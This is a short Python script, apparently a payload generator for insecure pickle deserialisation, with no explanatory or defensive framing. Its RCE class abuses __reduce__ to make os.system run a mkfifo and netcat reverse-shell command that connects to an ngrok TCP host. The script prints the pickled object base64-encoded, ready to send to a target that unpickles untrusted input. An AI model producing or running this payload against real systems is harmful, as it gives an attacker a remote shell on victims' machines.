import base64
import os
import pickle
import requests

NGROK_HOST = "0.tcp.eu.ngrok.io"
NGROK_PORT = 13000
class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (NGROK_HOST, NGROK_PORT)

        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
